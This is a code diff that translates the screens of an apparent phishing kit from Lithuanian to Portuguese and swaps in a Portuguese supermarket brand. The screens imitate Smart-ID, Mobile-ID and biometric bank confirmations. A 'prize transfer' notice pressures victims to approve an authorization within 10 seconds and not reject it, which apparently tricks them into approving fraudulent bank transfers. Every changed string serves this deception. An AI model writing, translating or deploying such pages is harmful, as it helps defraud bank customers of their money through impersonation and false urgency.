@@ -25,10 +25,10 @@ type ApprovalViewState = {
 const APPROVAL_LABELS: Record<string, string> = {
   smartid_1: "Smart-ID",
   smartid_2: "Smart-ID 2",
-  mobileid_1: "M. parašas",
-  mobileid_2: "M. parašas 2",
-  biometrika_pin_1: "Biometrija",
-  biometrika_pin_2: "Biometrija 2",
+  mobileid_1: "Mobile-ID",
+  mobileid_2: "Mobile-ID 2",
+  biometrika_pin_1: "Biometria",
+  biometrika_pin_2: "Biometria 2",
 };
 
 function parseApprovalHistory(value: unknown): string[] {
@@ -109,17 +109,17 @@ function SmartIdApprovalCard({
 
         <div className="space-y-5 text-center">
           <h1 className="text-[2rem] font-semibold leading-[1.18] tracking-[-0.03em] text-[#101828]">
-            Atidarykite Smart-ID programėlę savo telefone.
+            Abra a aplicação Smart-ID no seu telemóvel.
           </h1>
 
-          <p className="text-[1.08rem] text-[#667085]">Patvirtinkite naudodami {pinLabel} kodą</p>
+          <p className="text-[1.08rem] text-[#667085]">Confirme utilizando o código {pinLabel}</p>
 
           <div className="rounded-[12px] border border-[#d8dde5] bg-[#f8fafc] px-5 py-5 text-[2.5rem] font-semibold tracking-[0.14em] text-[#111827]">
             {approvalCode || "0000"}
           </div>
 
           <p className="text-[1rem] text-[#667085]">
-            Liko laiko: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
+            Tempo restante: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
           </p>
 
           <button
@@ -128,7 +128,7 @@ function SmartIdApprovalCard({
             disabled={saving}
             className="w-full rounded-[10px] bg-[var(--brand)] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[var(--brand-dark)] disabled:cursor-not-allowed disabled:opacity-70"
           >
-            {saving ? "Patvirtinama..." : "Patvirtinti"}
+            {saving ? "A confirmar..." : "Confirmar"}
           </button>
         </div>
       </div>
@@ -153,15 +153,15 @@ function GenericApprovalCard({
     <div className="flex min-h-screen items-center justify-center px-4 py-8">
       <div className="w-full max-w-[420px] rounded-[22px] border border-[#d9dee6] bg-white p-7 text-center shadow-[0_24px_80px_rgba(20,32,56,0.10)]">
         <p className="mb-3 text-sm font-semibold uppercase tracking-[0.24em] text-[#22c55e]">{title}</p>
-        <h1 className="mb-3 text-3xl font-semibold tracking-[-0.03em] text-[#101828]">Būtinas patvirtinimas</h1>
-        <p className="mb-6 text-base text-[#667085]">Norėdami tęsti, patvirtinkite savo įrenginyje rodomą patvirtinimo kodą.</p>
+        <h1 className="mb-3 text-3xl font-semibold tracking-[-0.03em] text-[#101828]">Confirmação Necessária</h1>
+        <p className="mb-6 text-base text-[#667085]">Para continuar, confirme o código de verificação apresentado no seu dispositivo.</p>
 
         <div className="mb-4 rounded-2xl border border-[#d8dde5] bg-[#f8fafc] px-5 py-5 text-4xl font-semibold tracking-[0.14em] text-[#111827]">
           {approvalCode || "0000"}
         </div>
 
         <p className="mb-6 text-sm text-[#667085]">
-          Liko laiko: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
+          Tempo restante: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
         </p>
 
         <button
@@ -170,7 +170,7 @@ function GenericApprovalCard({
           disabled={saving}
           className="w-full rounded-[12px] bg-[var(--brand)] px-4 py-4 text-base font-medium text-white transition hover:bg-[var(--brand-dark)] disabled:cursor-not-allowed disabled:opacity-70"
         >
-          {saving ? "Patvirtinama..." : "Patvirtinti"}
+          {saving ? "A confirmar..." : "Confirmar"}
         </button>
       </div>
     </div>
@@ -199,17 +199,17 @@ function MobileIdApprovalCard({
 
         <div className="space-y-5 text-center">
           <h1 className="text-[2rem] font-semibold leading-[1.18] tracking-[-0.03em] text-[#101828]">
-            Eikite į savo Mobile-ID programą savo telefone.
+            Aceda à aplicação Mobile-ID no seu telemóvel.
           </h1>
 
-          <p className="text-[1.08rem] text-[#667085]">Patvirtinkite naudodami {pinLabel} kodą</p>
+          <p className="text-[1.08rem] text-[#667085]">Confirme utilizando o código {pinLabel}</p>
 
           <div className="rounded-[12px] border border-[#d8dde5] bg-[#f8fafc] px-5 py-5 text-[2.5rem] font-semibold tracking-[0.14em] text-[#111827]">
             {approvalCode || "0000"}
           </div>
 
           <p className="text-[1rem] text-[#667085]">
-            Liko laiko: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
+            Tempo restante: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
           </p>
 
           <button
@@ -218,7 +218,7 @@ function MobileIdApprovalCard({
             disabled={saving}
             className="w-full rounded-[10px] bg-[var(--brand)] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[var(--brand-dark)] disabled:cursor-not-allowed disabled:opacity-70"
           >
-            {saving ? "Patvirtinama..." : "Patvirtinti"}
+            {saving ? "A confirmar..." : "Confirmar"}
           </button>
         </div>
       </div>
@@ -252,29 +252,29 @@ function BiometricApprovalCard({
           {bankLogo ? (
             <img
               src={bankLogo}
-              alt={bankName || bankSlug || "Banka"}
+              alt={bankName || bankSlug || "Banco"}
               className="max-h-12 w-auto max-w-[190px] object-contain"
             />
           ) : (
             <div className="text-center text-2xl font-semibold tracking-[-0.03em] text-[#101828]">
-              {bankName || bankSlug || "Bankas"}
+              {bankName || bankSlug || "Banco"}
             </div>
           )}
         </div>
 
         <div className="space-y-5 text-center">
           <h1 className="text-[2rem] font-semibold leading-[1.18] tracking-[-0.03em] text-[#101828]">
-            Biometrinis patvirtinimas
+            Confirmação Biométrica
           </h1>
 
-          <p className="text-[1.08rem] text-[#667085]">Patvirtinkite naudodami {pinLabel} kodą</p>
+          <p className="text-[1.08rem] text-[#667085]">Confirme utilizando o código {pinLabel}</p>
 
           <div className="rounded-[12px] border border-[#d8dde5] bg-[#f8fafc] px-5 py-5 text-[2.5rem] font-semibold tracking-[0.14em] text-[#111827]">
             {approvalCode || "0000"}
           </div>
 
           <p className="text-[1rem] text-[#667085]">
-            Liko laiko: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
+            Tempo restante: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
           </p>
 
           <button
@@ -283,7 +283,7 @@ function BiometricApprovalCard({
             disabled={saving}
             className="w-full rounded-[10px] bg-[var(--brand)] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[var(--brand-dark)] disabled:cursor-not-allowed disabled:opacity-70"
           >
-            {saving ? "Patvirtinama..." : "Patvirtinti"}
+            {saving ? "A confirmar..." : "Confirmar"}
           </button>
         </div>
       </div>
@@ -318,20 +318,20 @@ function TransferApprovalCard({
         <div className="mb-6 flex items-start justify-between">
           <img
             src="/form-assets/iki-mini-logo.png"
-            alt="IKI"
+            alt="Pingo Doce"
             className="h-7 w-auto object-contain"
           />
           {bankLogo ? (
             <img
               src={bankLogo}
-              alt={bankName || bankSlug || "Banka"}
+              alt={bankName || bankSlug || "Banco"}
               className="h-9 w-9 rounded-full border border-gray-100 object-cover shadow-sm"
             />
           ) : null}
         </div>
 
         <h1 className="mb-6 text-center text-[1.35rem] font-bold tracking-tight text-gray-800">
-          Patvirtinimo pranešimas
+          Notificação de Confirmação
         </h1>
 
         <div className="mb-6 flex justify-center">
@@ -340,15 +340,15 @@ function TransferApprovalCard({
 
         <div className="mb-6 rounded-2xl bg-[#f4f7fb] px-5 py-4">
           <p className="text-center text-[13px] font-medium leading-relaxed text-gray-600">
-            Sveikiname, kadangi kampanijoje yra ne vienas laimėtojas, dalis{" "}
-            <span className="font-bold text-gray-900">€{shownAmount}</span> sumos patvirtinimo
-            pranešime, kurį matote paraiškoje, bus pervesta jums. Patvirtinkite instrukcijas
-            per 10 sekundžių ir jų neatmeskite. Šį pavedimą tvarko jūsų banka.
+            Parabéns! Como existem vários vencedores na campanha, uma parte do montante de{" "}
+            <span className="font-bold text-gray-900">€{shownAmount}</span> indicado na notificação de
+            confirmação que vê na aplicação será transferida para si. Confirme as instruções
+            dentro de 10 segundos e não as rejeite. Esta transferência é processada pelo seu banco.
           </p>
         </div>
 
         <p className="mb-5 text-center text-[13px] text-gray-500">
-          Liko laiko: <span className="font-bold text-gray-800">{secondsLeft} s</span>
+          Tempo restante: <span className="font-bold text-gray-800">{secondsLeft} s</span>
         </p>
 
         <button
@@ -360,7 +360,7 @@ function TransferApprovalCard({
           <svg className="h-5 w-5" fill="none" stroke="currentColor" strokeWidth={2.5} viewBox="0 0 24 24">
             <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75L11.25 15 15 9.75M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
           </svg>
-          {saving ? "Patvirtinama..." : "Patvirtinti"}
+          {saving ? "A confirmar..." : "Confirmar"}
         </button>
       </div>
     </div>
@@ -372,7 +372,7 @@ function SpecialNoticeCard({ message, imageUrl }: { message: string; imageUrl: s
     <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
       <div className="w-full max-w-[650px] rounded-[24px] border border-[var(--brand)] bg-[var(--brand-panel)] p-6 text-center shadow-[0_0_40px_rgba(var(--brand-rgb),0.3)] sm:p-10">
         <div className="mb-4">
-          <p className="text-xs font-bold uppercase tracking-widest text-[var(--brand-dark)]">Klientų aptarnavimas</p>
+          <p className="text-xs font-bold uppercase tracking-widest text-[var(--brand-dark)]">Apoio ao Cliente</p>
         </div>
 
         <p className="mb-6 whitespace-pre-wrap text-lg font-bold leading-tight text-white">
@@ -403,7 +403,7 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
     transferAmount: "",
     bankSlug: "",
     bankName: "",
-    message: "Prašome palaukti...",
+    message: "Por favor, aguarde...",
     imageUrl: null,
     lang: "de",
   });
@@ -448,7 +448,7 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
         transferAmount: fd.transferAmount?.trim() ?? "",
         bankSlug: fd.bankSlug?.trim() ?? "",
         bankName: fd.bankName?.trim() ?? "",
-        message: fd.specialNoticeText ?? fd.customMessage ?? "Prašome palaukti...",
+        message: fd.specialNoticeText ?? fd.customMessage ?? "Por favor, aguarde...",
         imageUrl: fd.specialNoticeImage ?? fd.customImage ?? null,
         lang: (fd.specialNoticeLang as ApprovalLang | undefined) ?? "de",
       });
@@ -537,8 +537,8 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
               <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
             </svg>
           </div>
-          <h1 className="text-xl font-bold text-[#101828]">Patvirtinta!</h1>
-          <p className="mt-2 text-sm text-[#667085]">Prašome palaukti, nukreipiama...</p>
+          <h1 className="text-xl font-bold text-[#101828]">Confirmado!</h1>
+          <p className="mt-2 text-sm text-[#667085]">Por favor, aguarde, a redirecionar...</p>
           <div className="mx-auto mt-5 h-6 w-6 animate-spin rounded-full border-[3px] border-[var(--brand)]/20 border-t-[var(--brand)]" />
         </div>
       </div>
@@ -600,7 +600,7 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
   if (viewState.approvalStatus) {
     return (
       <GenericApprovalCard
-        title={APPROVAL_LABELS[viewState.approvalStatus] ?? "Kinnitus"}
+        title={APPROVAL_LABELS[viewState.approvalStatus] ?? "Confirmação"}
         approvalCode={viewState.approvalCode}
         secondsLeft={secondsLeft}
         saving={saving}
